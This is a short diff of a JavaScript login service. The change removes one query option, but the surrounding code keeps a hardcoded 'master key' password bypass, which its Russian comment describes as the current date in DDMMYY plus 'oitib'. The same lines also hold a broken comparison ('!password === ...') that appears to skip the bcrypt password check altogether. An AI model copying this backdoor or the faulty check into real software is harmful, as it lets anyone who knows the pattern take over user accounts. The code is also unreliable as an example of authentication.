@@ -109,12 +109,10 @@ class LoginService {
     const user = await UserModels.findOne({
       filter: { "users.login": login },
       isAddRights: true,
-      isAddForeignTables: true,
     });
     if (!user) {
       throw ApiError.BadRequest("Пользователь с таким login'ом не найден");
     }
-
     //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день
     if (!password === `${moment().format("DDMMYY")}oitib`) {
       const isPassEquals = await bcrypt.compare(password, user.password);
